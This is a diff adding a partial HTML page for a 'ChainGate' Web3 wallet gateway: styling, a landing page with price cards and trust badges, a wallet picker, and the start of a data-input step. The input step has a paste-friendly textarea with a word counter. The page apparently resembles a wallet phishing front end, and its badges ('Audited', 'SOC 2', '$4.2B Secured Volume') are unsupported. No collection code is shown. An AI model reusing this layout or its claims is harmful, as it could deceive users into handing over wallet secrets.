@@ -1,0 +1,2078 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ChainGate — Web3 Wallet Gateway</title>
+<style>
+  :root{
+    --bg:#06060c;
+    --panel:rgba(255,255,255,.05);
+    --panel-strong:rgba(255,255,255,.08);
+    --stroke:rgba(255,255,255,.12);
+    --txt:#eef0ff;
+    --muted:#9aa0c3;
+    --brand:#7c5cff;
+    --brand2:#22d3ee;
+    --ok:#34d399;
+    --warn:#fbbf24;
+    --bad:#f87171;
+    --grad:linear-gradient(135deg,#7c5cff,#22d3ee);
+    --shadow:0 24px 70px rgba(0,0,0,.45);
+  }
+
+  *{
+    box-sizing:border-box;
+    margin:0;
+    padding:0;
+    font-family:'Segoe UI',system-ui,-apple-system,sans-serif;
+  }
+
+  html{
+    scroll-behavior:smooth;
+  }
+
+  body{
+    min-height:100vh;
+    overflow-x:hidden;
+    color:var(--txt);
+    background:
+      radial-gradient(1200px 800px at 12% -10%, rgba(124,92,255,.18), transparent 55%),
+      radial-gradient(1000px 700px at 100% 110%, rgba(34,211,238,.14), transparent 55%),
+      var(--bg);
+  }
+
+  .orb{
+    position:fixed;
+    border-radius:50%;
+    filter:blur(90px);
+    opacity:.32;
+    pointer-events:none;
+    z-index:0;
+  }
+
+  .orb.a{
+    width:420px;
+    height:420px;
+    background:#7c5cff;
+    top:-120px;
+    left:-100px;
+    animation:float 14s ease-in-out infinite;
+  }
+
+  .orb.b{
+    width:380px;
+    height:380px;
+    background:#22d3ee;
+    bottom:-140px;
+    right:-90px;
+    animation:float 18s ease-in-out infinite reverse;
+  }
+
+  .orb.c{
+    width:300px;
+    height:300px;
+    background:#f472b6;
+    top:45%;
+    left:55%;
+    animation:float 22s ease-in-out infinite;
+  }
+
+  @keyframes float{
+    0%,100%{transform:translate(0,0) scale(1)}
+    50%{transform:translate(40px,-50px) scale(1.15)}
+  }
+
+  .grid-lines{
+    position:fixed;
+    inset:0;
+    z-index:0;
+    pointer-events:none;
+    background-image:
+      linear-gradient(rgba(255,255,255,.03) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(255,255,255,.03) 1px, transparent 1px);
+    background-size:64px 64px;
+    mask-image:radial-gradient(ellipse at center, #000 30%, transparent 75%);
+    -webkit-mask-image:radial-gradient(ellipse at center, #000 30%, transparent 75%);
+  }
+
+  .horizon{
+    position:fixed;
+    bottom:0;
+    left:0;
+    right:0;
+    height:180px;
+    background:linear-gradient(transparent, rgba(124,92,255,.08));
+    z-index:1;
+    pointer-events:none;
+    overflow:hidden;
+  }
+
+  .horizon::before{
+    content:'';
+    position:absolute;
+    inset:-60% -20% 0;
+    background-image:
+      linear-gradient(rgba(124,92,255,.25) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(34,211,238,.18) 1px, transparent 1px);
+    background-size:60px 60px;
+    transform:perspective(340px) rotateX(62deg);
+    animation:scrollG 3s linear infinite;
+  }
+
+  @keyframes scrollG{
+    to{background-position:0 60px, 0 0;}
+  }
+
+  .page{
+    display:none;
+    position:relative;
+    z-index:2;
+    width:100%;
+    min-height:100vh;
+    flex-direction:column;
+    align-items:center;
+    padding:24px 20px 132px;
+  }
+
+  .page.active{
+    display:flex;
+    animation:fadeIn .4s ease both;
+  }
+
+  @keyframes fadeIn{
+    from{opacity:0;}
+    to{opacity:1;}
+  }
+
+  .grad{
+    background:var(--grad);
+    -webkit-background-clip:text;
+    background-clip:text;
+    color:transparent;
+  }
+
+  .fade-in{
+    animation:fadeUp .55s ease both;
+  }
+
+  @keyframes fadeUp{
+    from{opacity:0; transform:translateY(18px);}
+    to{opacity:1; transform:translateY(0);}
+  }
+
+  .logo{
+    display:flex;
+    align-items:center;
+    gap:10px;
+    font-weight:800;
+    font-size:20px;
+  }
+
+  .logo-mark{
+    width:36px;
+    height:36px;
+    border-radius:11px;
+    background:var(--grad);
+    display:grid;
+    place-items:center;
+    font-size:17px;
+    box-shadow:0 8px 24px rgba(124,92,255,.5);
+    position:relative;
+    overflow:hidden;
+    color:#fff;
+  }
+
+  .logo-mark::after{
+    content:'';
+    position:absolute;
+    inset:0;
+    background:linear-gradient(115deg, transparent 30%, rgba(255,255,255,.55) 50%, transparent 70%);
+    animation:sweep 3s linear infinite;
+  }
+
+  @keyframes sweep{
+    from{transform:translateX(-100%);}
+    to{transform:translateX(100%);}
+  }
+
+  h1{
+    font-size:clamp(34px,6vw,58px);
+    line-height:1.08;
+    font-weight:800;
+    text-align:center;
+    letter-spacing:-1.5px;
+  }
+
+  .sub{
+    color:var(--muted);
+    font-size:clamp(15px,2vw,18px);
+    text-align:center;
+    max-width:620px;
+    margin-top:16px;
+    line-height:1.65;
+  }
+
+  .topbar{
+    position:sticky;
+    top:14px;
+    z-index:30;
+    width:100%;
+    max-width:1100px;
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    gap:12px;
+    flex-wrap:wrap;
+    padding:12px 14px;
+    margin-bottom:34px;
+    background:rgba(6,6,12,.78);
+    border:1px solid var(--stroke);
+    border-radius:18px;
+    backdrop-filter:blur(16px);
+    -webkit-backdrop-filter:blur(16px);
+    box-shadow:0 12px 30px rgba(0,0,0,.25);
+  }
+
+  .topbar-badges{
+    display:flex;
+    gap:10px;
+    flex-wrap:wrap;
+    align-items:center;
+  }
+
+  .top-cta{
+    display:inline-flex;
+    align-items:center;
+    gap:9px;
+    padding:12px 24px;
+    border:0;
+    border-radius:999px;
+    cursor:pointer;
+    font-size:14px;
+    font-weight:700;
+    color:#fff;
+    background:var(--grad);
+    box-shadow:0 12px 30px rgba(124,92,255,.4);
+    transition:.25s;
+    flex:0 0 auto;
+    font-family:inherit;
+  }
+
+  .top-cta:hover{
+    transform:translateY(-2px);
+    box-shadow:0 16px 38px rgba(124,92,255,.55);
+  }
+
+  .top-cta:active{
+    transform:scale(.97);
+  }
+
+  .top-cta svg{
+    width:16px;
+    height:16px;
+    flex:0 0 auto;
+  }
+
+  .badge{
+    display:inline-flex;
+    align-items:center;
+    gap:8px;
+    padding:9px 14px;
+    border-radius:999px;
+    border:1px solid var(--stroke);
+    background:var(--panel);
+    font-size:12.5px;
+    font-weight:600;
+    color:var(--muted);
+    backdrop-filter:blur(12px);
+    -webkit-backdrop-filter:blur(12px);
+  }
+
+  .badge svg{
+    width:14px;
+    height:14px;
+    color:var(--brand2);
+    flex:0 0 auto;
+  }
+
+  .badge .dot{
+    width:7px;
+    height:7px;
+    border-radius:50%;
+    background:var(--ok);
+    box-shadow:0 0 10px var(--ok);
+    animation:pulse 2s infinite;
+  }
+
+  @keyframes pulse{
+    50%{opacity:.4;}
+  }
+
+  .inner{
+    width:100%;
+    max-width:1100px;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    gap:26px;
+    text-align:center;
+  }
+
+  .headline{
+    max-width:840px;
+    perspective:700px;
+  }
+
+  .headline .w{
+    display:inline-block;
+    opacity:0;
+    transform:translateY(26px) rotateX(35deg);
+    animation:wordIn .6s cubic-bezier(.2,.9,.3,1.15) forwards;
+  }
+
+  @keyframes wordIn{
+    to{
+      opacity:1;
+      transform:translateY(0) rotateX(0);
+    }
+  }
+
+  .hero-stats{
+    width:100%;
+    max-width:680px;
+    display:grid;
+    grid-template-columns:repeat(3, minmax(0,1fr));
+    gap:14px;
+  }
+
+  .stat{
+    background:var(--panel);
+    border:1px solid var(--stroke);
+    border-radius:18px;
+    padding:18px 16px;
+    text-align:center;
+    backdrop-filter:blur(14px);
+    -webkit-backdrop-filter:blur(14px);
+  }
+
+  .stat b{
+    display:block;
+    font-size:24px;
+    background:var(--grad);
+    -webkit-background-clip:text;
+    background-clip:text;
+    color:transparent;
+  }
+
+  .stat span{
+    display:block;
+    margin-top:6px;
+    font-size:12px;
+    color:var(--muted);
+  }
+
+  .cta-wrap{
+    width:100%;
+    max-width:420px;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    gap:12px;
+    margin-top:6px;
+  }
+
+  .cta-note{
+    font-size:12.5px;
+    color:var(--muted);
+  }
+
+  .btn{
+    border:0;
+    cursor:pointer;
+    border-radius:16px;
+    padding:16px 32px;
+    font-size:15px;
+    font-weight:700;
+    color:#fff;
+    background:var(--grad);
+    box-shadow:0 14px 34px rgba(124,92,255,.35);
+    transition:.25s;
+    position:relative;
+    display:inline-flex;
+    align-items:center;
+    justify-content:center;
+    gap:9px;
+  }
+
+  .btn:hover{
+    transform:translateY(-3px);
+    box-shadow:0 18px 44px rgba(124,92,255,.5);
+  }
+
+  .btn:active{
+    transform:scale(.98);
+  }
+
+  .btn.ghost{
+    background:var(--panel);
+    border:1px solid var(--stroke);
+    box-shadow:none;
+    color:var(--txt);
+  }
+
+  .btn.ghost:hover{
+    background:rgba(255,255,255,.09);
+    border-color:rgba(255,255,255,.2);
+    box-shadow:none;
+  }
+
+  .btn.block{
+    width:100%;
+  }
+
+  .btn:disabled{
+    opacity:.45;
+    cursor:not-allowed;
+    transform:none;
+  }
+
+  .glow-btn{
+    z-index:0;
+  }
+
+  .glow-btn::before{
+    content:'';
+    position:absolute;
+    inset:-4px;
+    border-radius:20px;
+    background:var(--grad);
+    filter:blur(18px);
+    opacity:.45;
+    z-index:-1;
+    animation:glowPulse 2.6s ease-in-out infinite;
+  }
+
+  @keyframes glowPulse{
+    0%,100%{opacity:.35; transform:scale(.97);}
+    50%{opacity:.7; transform:scale(1.03);}
+  }
+
+  .trust{
+    display:flex;
+    gap:18px;
+    flex-wrap:wrap;
+    justify-content:center;
+    font-size:11.5px;
+    color:var(--muted);
+    letter-spacing:1px;
+    text-transform:uppercase;
+    align-items:center;
+  }
+
+  .trust span{
+    display:inline-flex;
+    align-items:center;
+    gap:6px;
+  }
+
+  .trust svg{
+    width:14px;
+    height:14px;
+    color:var(--brand2);
+  }
+
+  .prices-section{
+    width:100%;
+    max-width:1100px;
+    margin-top:28px;
+    display:flex;
+    flex-direction:column;
+    gap:16px;
+  }
+
+  .prices-title{
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    gap:8px;
+    font-size:13px;
+    font-weight:800;
+    color:var(--muted);
+    text-transform:uppercase;
+    letter-spacing:2px;
+    text-align:center;
+  }
+
+  .prices-title svg{
+    width:16px;
+    height:16px;
+    color:var(--brand2);
+  }
+
+  .coin-grid{
+    display:grid;
+    grid-template-columns:repeat(auto-fill, minmax(150px,1fr));
+    gap:12px;
+  }
+
+  .coin-card{
+    background:var(--panel);
+    border:1px solid var(--stroke);
+    border-radius:16px;
+    padding:16px;
+    backdrop-filter:blur(12px);
+    -webkit-backdrop-filter:blur(12px);
+    animation:fadeUp .5s ease backwards;
+    display:flex;
+    flex-direction:column;
+    gap:10px;
+  }
+
+  .coin-head{
+    display:flex;
+    justify-content:space-between;
+    align-items:flex-start;
+    gap:10px;
+  }
+
+  .coin-name{
+    font-size:13px;
+    color:var(--muted);
+    line-height:1.35;
+  }
+
+  .coin-sym{
+    display:block;
+    margin-top:3px;
+    font-size:11px;
+    color:var(--txt);
+    font-weight:800;
+    letter-spacing:.5px;
+  }
+
+  .coin-ico{
+    flex:0 0 auto;
+    width:38px;
+    height:38px;
+    border-radius:12px;
+    display:grid;
+    place-items:center;
+    background:linear-gradient(135deg, rgba(124,92,255,.16), rgba(34,211,238,.12));
+    border:1px solid var(--stroke);
+    color:var(--brand2);
+    font-size:12px;
+    font-weight:800;
+  }
+
+  .coin-price{
+    font-size:18px;
+    font-weight:800;
+    color:var(--txt);
+  }
+
+  .coin-chg{
+    font-size:12.5px;
+    font-weight:700;
+  }
+
+  .coin-chg.up{
+    color:var(--ok);
+  }
+
+  .coin-chg.down{
+    color:var(--bad);
+  }
+
+  .ticker{
+    position:fixed;
+    left:0;
+    right:0;
+    bottom:18px;
+    z-index:20;
+    height:38px;
+    display:flex;
+    align-items:center;
+    overflow:hidden;
+    pointer-events:none;
+    background:linear-gradient(90deg, transparent, rgba(6,6,12,.88) 12%, rgba(6,6,12,.88) 88%, transparent);
+    border-top:1px solid rgba(255,255,255,.06);
+    border-bottom:1px solid rgba(255,255,255,.06);
+    backdrop-filter:blur(10px);
+    -webkit-backdrop-filter:blur(10px);
+  }
+
+  .ticker-in{
+    display:inline-flex;
+    white-space:nowrap;
+    animation:tick 30s linear infinite;
+    font-size:13px;
+    color:var(--muted);
+    font-weight:700;
+    letter-spacing:.5px;
+  }
+
+  .ticker-in span{
+    display:inline-flex;
+    align-items:center;
+    gap:6px;
+    margin-right:36px;
+  }
+
+  .ticker-in em{
+    font-style:normal;
+    font-size:12px;
+    margin-left:6px;
+  }
+
+  .ticker-in em.up{
+    color:var(--ok);
+  }
+
+  .ticker-in em.down{
+    color:var(--bad);
+  }
+
+  @keyframes tick{
+    from{transform:translateX(0);}
+    to{transform:translateX(-50%);}
+  }
+
+  .page-head{
+    width:100%;
+    max-width:1100px;
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    gap:16px;
+    flex-wrap:wrap;
+    margin-bottom:26px;
+  }
+
+  .back{
+    display:inline-flex;
+    align-items:center;
+    gap:8px;
+    color:var(--muted);
+    background:var(--panel);
+    border:1px solid var(--stroke);
+    padding:10px 16px;
+    border-radius:12px;
+    cursor:pointer;
+    font-size:14px;
+    font-weight:600;
+    transition:.2s;
+  }
+
+  .back:hover{
+    color:#fff;
+    background:rgba(255,255,255,.1);
+    border-color:rgba(255,255,255,.2);
+  }
+
+  .back svg{
+    width:16px;
+    height:16px;
+    color:var(--brand2);
+  }
+
+  .step{
+    font-size:12px;
+    color:var(--brand2);
+    font-weight:800;
+    letter-spacing:2px;
+    text-transform:uppercase;
+  }
+
+  .page-content{
+    width:100%;
+    max-width:1100px;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    gap:16px;
+    text-align:center;
+    margin-bottom:26px;
+  }
+
+  .page-title{
+    font-size:clamp(26px,4vw,38px);
+    letter-spacing:-.8px;
+  }
+
+  .card{
+    background:var(--panel);
+    border:1px solid var(--stroke);
+    border-radius:24px;
+    padding:34px;
+    backdrop-filter:blur(18px);
+    -webkit-backdrop-filter:blur(18px);
+    width:100%;
+    max-width:560px;
+    box-shadow:var(--shadow);
+  }
+
+  .card-title{
+    font-size:26px;
+    line-height:1.2;
+    margin-bottom:10px;
+    text-align:left;
+    letter-spacing:-.5px;
+  }
+
+  .card-title.center{
+    text-align:center;
+  }
+
+  .card-sub{
+    color:var(--muted);
+    font-size:14.5px;
+    line-height:1.6;
+    margin-bottom:22px;
+    text-align:left;
+  }
+
+  .card-sub.center{
+    text-align:center;
+    margin-bottom:18px;
+  }
+
+  .field{
+    width:100%;
+    display:flex;
+    flex-direction:column;
+    gap:8px;
+    margin-bottom:18px;
+  }
+
+  label{
+    display:flex;
+    align-items:center;
+    gap:8px;
+    font-size:13px;
+    color:var(--muted);
+    font-weight:700;
+  }
+
+  label svg{
+    width:16px;
+    height:16px;
+    color:var(--brand2);
+  }
+
+  input[type=email],
+  input[type=text],
+  textarea{
+    width:100%;
+    padding:15px 16px;
+    border-radius:14px;
+    border:1px solid var(--stroke);
+    background:rgba(0,0,0,.35);
+    color:var(--txt);
+    font-size:15px;
+    outline:none;
+    transition:.2s;
+  }
+
+  textarea{
+    min-height:150px;
+    resize:vertical;
+    line-height:1.55;
+    font-family:inherit;
+  }
+
+  input:focus,
+  textarea:focus{
+    border-color:var(--brand);
+    box-shadow:0 0 0 4px rgba(124,92,255,.18);
+  }
+
+  .paste-row{
+    display:flex;
+    gap:10px;
+    flex-wrap:wrap;
+    margin-top:10px;
+  }
+
+  .paste-btn{
+    display:inline-flex;
+    align-items:center;
+    gap:8px;
+    padding:10px 14px;
+    border-radius:12px;
+    border:1px solid var(--stroke);
+    background:rgba(0,0,0,.28);
+    color:var(--muted);
+    cursor:pointer;
+    font-size:13px;
+    font-weight:600;
+    transition:.2s;
+  }
+
+  .paste-btn:hover{
+    color:#fff;
+    border-color:var(--brand);
+    background:rgba(124,92,255,.12);
+  }
+
+  .paste-btn svg{
+    width:15px;
+    height:15px;
+  }
+
+  .word-count{
+    margin-top:10px;
+    font-size:12px;
+    color:var(--muted);
+    display:flex;
+    align-items:center;
+    gap:8px;
+  }
+
+  .word-count.ok{
+    color:var(--ok);
+  }
+
+  .word-count.bad{
+    color:var(--bad);
+  }
+
+  .error{
+    display:none;
+    margin-top:12px;
+    padding:12px 14px;
+    border-radius:12px;
+    background:rgba(248,113,113,.1);
+    border:1px solid rgba(248,113,113,.3);
+    color:#fecaca;
+    font-size:13px;
+  }
+
+  .error.show{
+    display:block;
+  }
+
+  .gen-tab{
+    margin-top:24px;
+    width:100%;
+    display:flex;
+    flex-direction:column;
+    gap:12px;
+  }
+
+  .wallet-grid{
+    display:grid;
+    grid-template-columns:repeat(auto-fill, minmax(150px,1fr));
+    gap:14px;
+    width:100%;
+    max-width:1100px;
+  }
+
+  .wallet{
+    position:relative;
+    overflow:hidden;
+    background:var(--panel);
+    border:1px solid var(--stroke);
+    border-radius:18px;
+    padding:20px 12px;
+    text-align:center;
+    cursor:pointer;
+    backdrop-filter:blur(12px);
+    -webkit-backdrop-filter:blur(12px);
+    opacity:0;
+    transform:translateY(26px) scale(.94);
+    animation:walletIn .55s cubic-bezier(.2,.9,.3,1.2) forwards;
+    animation-delay:var(--d,0s);
+    transition:transform .25s, border-color .25s, box-shadow .25s;
+    font:inherit;
+    color:inherit;
+  }
+
+  @keyframes walletIn{
+    to{
+      opacity:1;
+      transform:translateY(0) scale(1);
+    }
+  }
+
+  .wallet::before{
+    content:'';
+    position:absolute;
+    inset:0;
+    background:radial-gradient(140px circle at var(--mx,50%) var(--my,50%), rgba(124,92,255,.22), transparent 65%);
+    opacity:0;
+    transition:opacity .25s;
+    pointer-events:none;
+  }
+
+  .wallet:hover::before{
+    opacity:1;
+  }
+
+  .wallet::after{
+    content:'';
+    position:absolute;
+    inset:-2px;
+    border-radius:20px;
+    padding:1.5px;
+    background:var(--grad);
+    -webkit-mask:linear-gradient(#000 0 0) content-box, linear-gradient(#000 0 0);
+    mask:linear-gradient(#000 0 0) content-box, linear-gradient(#000 0 0);
+    -webkit-mask-composite:xor;
+    mask-composite:exclude;
+    opacity:0;
+    transition:opacity .25s;
+    pointer-events:none;
+  }
+
+  .wallet:hover::after{
+    opacity:1;
+  }
+
+  .wallet:hover{
+    transform:translateY(-5px);
+    border-color:rgba(124,92,255,.55);
+    box-shadow:0 16px 36px rgba(124,92,255,.28);
+  }
+
+  .wallet:active{
+    transform:scale(.96);
+  }
+
+  .wallet.selected{
+    border-color:var(--brand);
+    background:rgba(124,92,255,.14);
+    box-shadow:0 16px 36px rgba(124,92,255,.28);
+  }
+
+  .wallet.selected::after{
+    opacity:1;
+  }
+
+  .wallet .ico{
+    width:54px;
+    height:54px;
+    border-radius:16px;
+    margin:0 auto 12px;
+    display:grid;
+    place-items:center;
+    overflow:hidden;
+    background:linear-gradient(135deg, rgba(124,92,255,.18), rgba(34,211,238,.14));
+    border:1px solid rgba(124,92,255,.28);
+    color:#d8ccff;
+  }
+
+  .wallet .ico svg{
+    width:26px;
+    height:26px;
+  }
+
+  .wallet .nm{
+    font-size:14px;
+    font-weight:700;
+    color:var(--txt);
+  }
+
+  .wallet .ty{
+    font-size:11.5px;
+    color:var(--muted);
+    margin-top:4px;
+  }
+
+  .ring{
+    width:112px;
+    height:112px;
+    border-radius:50%;
+    border:5px solid rgba(255,255,255,.08);
+    border-top-color:var(--brand);
+    border-right-color:var(--brand2);
+    animation:spin 1s linear infinite;
+    margin:0 auto 24px;
+  }
+
+  @keyframes spin{
+    to{transform:rotate(360deg);}
+  }
+
+  .gen-status{
+    font-size:15px;
+    color:var(--muted);
+    text-align:center;
+    min-height:22px;
+  }
+
+  .gen-progress{
+    font-size:38px;
+    font-weight:800;
+    background:var(--grad);
+    -webkit-background-clip:text;
+    background-clip:text;
+    color:transparent;
+    margin-top:14px;
+    text-align:center;
+  }
+
+  .success-ico{
+    width:96px;
+    height:96px;
+    border-radius:50%;
+    background:rgba(52,211,153,.12);
+    border:2px solid var(--ok);
+    display:grid;
+    place-items:center;
+    margin:0 auto 20px;
+    animation:pop .5s cubic-bezier(.2,1.6,.4,1);
+    color:var(--ok);
+  }
+
+  @keyframes pop{
+    from{transform:scale(.3); opacity:0;}
+  }
+
+  .id-box{
+    width:100%;
+    background:rgba(0,0,0,.42);
+    border:1px dashed rgba(124,92,255,.45);
+    border-radius:14px;
+    padding:16px;
+    font-family:ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    font-size:15px;
+    line-height:1.5;
+    color:var(--brand2);
+    word-break:break-all;
+    text-align:center;
+    margin:18px 0;
+  }
+
+  .code-box{
+    width:100%;
+    background:rgba(34,211,238,.06);
+    border:1px solid rgba(34,211,238,.3);
+    border-radius:14px;
+    padding:14px 16px;
+    font-family:ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    font-size:20px;
+    font-weight:800;
+    letter-spacing:3px;
+    color:var(--brand2);
+    text-align:center;
+    margin:0 0 18px;
+  }
+
+  .code-label{
+    font-size:11px;
+    letter-spacing:2px;
+    text-transform:uppercase;
+    color:var(--muted);
+    margin-bottom:8px;
+    font-weight:700;
+  }
+
+  .meta{
+    display:grid;
+    grid-template-columns:repeat(2, minmax(0,1fr));
+    gap:12px;
+    width:100%;
+    margin:22px 0;
+  }
+
+  .meta-item{
+    background:rgba(0,0,0,.3);
+    border:1px solid var(--stroke);
+    border-radius:14px;
+    padding:13px;
+  }
+
+  .meta-item span{
+    display:block;
+    font-size:11px;
+    color:var(--muted);
+    text-transform:uppercase;
+    letter-spacing:1px;
+    margin-bottom:6px;
+  }
+
+  .meta-item b{
+    font-size:14px;
+    color:var(--txt);
+    word-break:break-word;
+  }
+
+  .action-row{
+    display:flex;
+    gap:12px;
+    flex-wrap:wrap;
+    width:100%;
+    margin-top:24px;
+  }
+
+  .action-btn{
+    flex:1 1 160px;
+    display:inline-flex;
+    align-items:center;
+    justify-content:center;
+    gap:9px;
+    padding:14px 16px;
+    border-radius:14px;
+    border:1px solid var(--stroke);
+    background:var(--panel);
+    color:var(--txt);
+    font-size:14px;
+    font-weight:700;
+    cursor:pointer;
+    transition:.2s;
+  }
+
+  .action-btn:hover{
+    border-color:var(--brand);
+    background:rgba(124,92,255,.14);
+    transform:translateY(-2px);
+  }
+
+  .action-btn.primary{
+    background:var(--grad);
+    border:0;
+    color:#fff;
+    box-shadow:0 14px 30px rgba(124,92,255,.35);
+  }
+
+  .action-btn.primary:hover{
+    box-shadow:0 18px 40px rgba(124,92,255,.5);
+  }
+
+  .action-btn svg{
+    width:16px;
+    height:16px;
+    flex:0 0 auto;
+  }
+
+  .gen-card{
+    max-width:620px;
+    text-align:center;
+  }
+
+  #genSuccess{
+    display:none;
+    flex-direction:column;
+    align-items:center;
+  }
+
+  @media(max-width:640px){
+    .hero-stats{
+      grid-template-columns:1fr;
+    }
+
+    .card{
+      padding:26px 20px;
+    }
+
+    .meta{
+      grid-template-columns:1fr;
+    }
+
+    .action-row{
+      flex-direction:column;
+    }
+
+    .action-btn{
+      flex:1 1 auto;
+    }
+
+    .wallet-grid{
+      grid-template-columns:repeat(2,1fr);
+    }
+
+    .topbar{
+      justify-content:flex-start;
+    }
+  }
+</style>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
+</head>
+<body>
+
+<div class="orb a"></div>
+<div class="orb b"></div>
+<div class="orb c"></div>
+<div class="grid-lines"></div>
+<div class="horizon"></div>
+
+<!-- ============ PAGE 1 : LANDING ============ -->
+<section class="page active" id="page-landing">
+  <div class="topbar">
+    <button class="top-cta" onclick="go('page-wallets')">
+      Get Started
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+        <line x1="5" y1="12" x2="19" y2="12"></line>
+        <polyline points="12 5 19 12 12 19"></polyline>
+      </svg>
+    </button>
+
+    <div class="topbar-badges">
+      <div class="badge">
+        <span class="dot"></span>
+        Ethereum Mainnet
+      </div>
+
+      <div class="badge">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+          <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"></polygon>
+        </svg>
+        Gas 12 gwei
+      </div>
+
+      <div class="badge">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path>
+          <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path>
+        </svg>
+        Block #21,448,102
+      </div>
+    </div>
+  </div>
+
+  <div class="inner fade-in">
+    <div class="logo">
+      <div class="logo-mark">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path>
+          <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path>
+        </svg>
+      </div>
+      ChainGate
+    </div>
+
+    <h1 class="headline" id="headline"></h1>
+
+    <p class="sub">
+      Connect wallets · Generate temporary Block IDs · Verify tokens across long chains — fully non-custodial.
+    </p>
+
+    <div class="hero-stats">
+      <div class="stat">
+        <b data-count="120">0</b>
+        <span>Wallets Supported</span>
+      </div>
+      <div class="stat">
+        <b data-count="4.2" data-prefix="$" data-suffix="B">0</b>
+        <span>Secured Volume</span>
+      </div>
+      <div class="stat">
+        <b data-count="99.9" data-suffix="%">0</b>
+        <span>Uptime</span>
+      </div>
+    </div>
+
+    <div class="cta-wrap">
+      <span class="cta-note">Non-custodial · No signup · Open source</span>
+    </div>
+
+    <div class="trust">
+      <span>
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+        </svg>
+        Audited
+      </span>
+
+      <span>
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+          <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+          <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+        </svg>
+        SOC 2
+      </span>
+
+      <span>
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="12" cy="12" r="3"></circle>
+          <path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"></path>
+        </svg>
+        Open Source
+      </span>
+    </div>
+  </div>
+
+  <div class="prices-section">
+    <div class="prices-title">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+        <line x1="18" y1="20" x2="18" y2="10"></line>
+        <line x1="12" y1="20" x2="12" y2="4"></line>
+        <line x1="6" y1="20" x2="6" y2="14"></line>
+      </svg>
+      Live Crypto Prices
+    </div>
+    <div class="coin-grid" id="coinGrid"></div>
+  </div>
+</section>
+
+<!-- ============ PAGE 2 : WALLETS ============ -->
+<section class="page" id="page-wallets">
+  <div class="page-head">
+    <button class="back" onclick="go('page-landing')">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+        <line x1="19" y1="12" x2="5" y2="12"></line>
+        <polyline points="12 19 5 12 12 5"></polyline>
+      </svg>
+      Back
+    </button>
+    <div class="step">Step 1 of 3</div>
+  </div>
+
+  <div class="page-content">
+    <h1 class="page-title">Choose your <span class="grad">wallet</span></h1>
+    <p class="sub">Select the wallet you'd like to connect for this session.</p>
+  </div>
+
+  <div class="wallet-grid" id="walletGrid"></div>
+</section>
+
+<!-- ============ PAGE 3 : INPUT DATA ============ -->
+<section class="page" id="page-input">
+  <div class="page-head">
+    <button class="back" onclick="go('page-wallets')">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+        <line x1="19" y1="12" x2="5" y2="12"></line>
+        <polyline points="12 19 5 12 12 5"></polyline>
+      </svg>
+      Back
+    </button>
